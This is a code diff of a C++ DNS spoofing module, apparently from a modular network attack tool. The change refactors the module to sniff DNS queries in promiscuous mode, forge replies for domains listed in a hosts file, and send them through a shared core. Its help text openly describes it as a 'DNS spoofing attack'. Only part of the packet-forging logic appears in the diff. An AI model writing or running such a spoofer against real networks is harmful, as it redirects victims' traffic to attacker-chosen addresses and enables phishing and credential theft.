@@ -1,7 +1,7 @@
 #include "DnsSpoof.hh"
 
-DnsSpoof::DnsSpoof(const std::string &file)
-    : _iface(NetworkInterface::default_interface()), _sender(new PacketSender(_iface.name())), _sniffer(new Sniffer(_iface.name(), Sniffer::PROMISC))
+DnsSpoof::DnsSpoof(Core &core, const std::string &file, const std::string &interface)
+    : AModule(core, "DnsSpoof"), _file(file), _sniffer(interface, Sniffer::PROMISC)
 {
     readHosts(file);
 }
@@ -9,7 +9,7 @@ DnsSpoof::DnsSpoof(const std::string &file)
 void DnsSpoof::start(void)
 {
     // Only capture udp packets sent to port 53
-    _sniffer->set_filter("udp and dst port 53");
+    _sniffer.set_filter("udp and dst port 53");
 
     // Start the capture
     std::cout << "Starting dns spoofing" << std::endl;
@@ -20,7 +20,7 @@ void DnsSpoof::start(void)
 
 void DnsSpoof::sniff(void)
 {
-    _sniffer->sniff_loop(make_sniffer_handler(this, &DnsSpoof::dumpQuery));
+    _sniffer.sniff_loop(make_sniffer_handler(this, &DnsSpoof::spoofQuery));
 }
 
 void DnsSpoof::readHosts(const std::string &file)
@@ -34,20 +34,26 @@ void DnsSpoof::readHosts(const std::string &file)
 
 void DnsSpoof::stop(void)
 {
-    std::cout << "Stopping dns spoofing" << std::endl;
-    _sniffer->stop_sniff();
+    _sniffer.stop_sniff();
+}
+
+std::string DnsSpoof::info(void)
+{
+    return "Host file used : " + _file;
 }
 
 std::string DnsSpoof::help(void)
 {
     std::string rep;
 
-    rep += "Starting DNS spoofing\n";
+    rep += "Start DNS spoofing attack for domains in file.\n";
+    rep += "Host file must have the form : domain ip_adress\n";
+    rep += "\tOptions : <file>\n";
 
     return rep;
 }
 
-bool DnsSpoof::dumpQuery(PDU &pdu)
+bool DnsSpoof::spoofQuery(PDU &pdu)
 {
     // EthernetII / IP / UDP / RawPDU
     EthernetII eth = pdu.rfind_pdu<EthernetII>();
@@ -86,8 +92,9 @@ bool DnsSpoof::dumpQuery(PDU &pdu)
                                 UDP(udp.sport(), udp.dport()) /
                                 dns;
             // Send it!
-            _sender->send(pkt, _iface);
+            _core.send(pkt);
         }
     }
+    // Drop packet if return false ?
     return true;
 }
